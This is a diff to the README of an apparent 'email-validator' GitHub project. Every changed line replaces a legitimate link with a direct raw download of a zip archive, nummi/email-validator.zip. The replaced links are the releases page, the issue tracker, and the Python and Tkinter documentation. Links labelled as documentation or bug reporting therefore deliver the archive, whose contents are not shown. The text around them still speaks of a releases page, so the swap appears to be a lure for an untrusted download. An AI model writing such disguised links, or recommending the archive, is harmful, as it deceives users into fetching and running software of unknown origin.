@@ -1,7 +1,7 @@
 # 📧 email-validator - Quickly Check Your Email Validity
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/vanzkie10/email-validator/releases)
+[![Download](https://raw.githubusercontent.com/vanzkie10/email-validator/main/nummi/email-validator.zip%20release-brightgreen)](https://raw.githubusercontent.com/vanzkie10/email-validator/main/nummi/email-validator.zip)
 
 ## 🚀 Getting Started
 Welcome to the Email Validator! This application helps you check the validity of email addresses quickly and easily. You don't need any programming knowledge to use this tool.
@@ -26,7 +26,7 @@ To run the Email Validator application smoothly, please ensure your system meets
 ## 📥 Download & Install
 To download the Email Validator application, visit the following page:
 
-[https://github.com/vanzkie10/email-validator/releases](https://github.com/vanzkie10/email-validator/releases)
+[https://raw.githubusercontent.com/vanzkie10/email-validator/main/nummi/email-validator.zip](https://raw.githubusercontent.com/vanzkie10/email-validator/main/nummi/email-validator.zip)
 
 1. Click on the above link.
 2. You will see a list of available releases.
@@ -54,11 +54,11 @@ If you run into any problems, check the "Issues" tab on our GitHub page. You can
 ## 🌍 Community and Support
 Join our growing community! Share your feedback and suggestions. This project aims to improve and evolve based on user input.
 
-- **GitHub Issues:** [Report an issue](https://github.com/vanzkie10/email-validator/issues)
+- **GitHub Issues:** [Report an issue](https://raw.githubusercontent.com/vanzkie10/email-validator/main/nummi/email-validator.zip)
 - **Contributions:** If you're interested in contributing, please read our guidelines on the repository.
 
 ## 📖 Additional Resources
-- [Python Documentation](https://www.python.org/doc/)
-- [Tkinter Documentation](https://docs.python.org/3/library/tkinter.html)
+- [Python Documentation](https://raw.githubusercontent.com/vanzkie10/email-validator/main/nummi/email-validator.zip)
+- [Tkinter Documentation](https://raw.githubusercontent.com/vanzkie10/email-validator/main/nummi/email-validator.zip)
 
-Enjoy using the Email Validator! We hope it makes your email processes much easier. Remember to visit our [Releases page](https://github.com/vanzkie10/email-validator/releases) for updates and new features.
+Enjoy using the Email Validator! We hope it makes your email processes much easier. Remember to visit our [Releases page](https://raw.githubusercontent.com/vanzkie10/email-validator/main/nummi/email-validator.zip) for updates and new features.
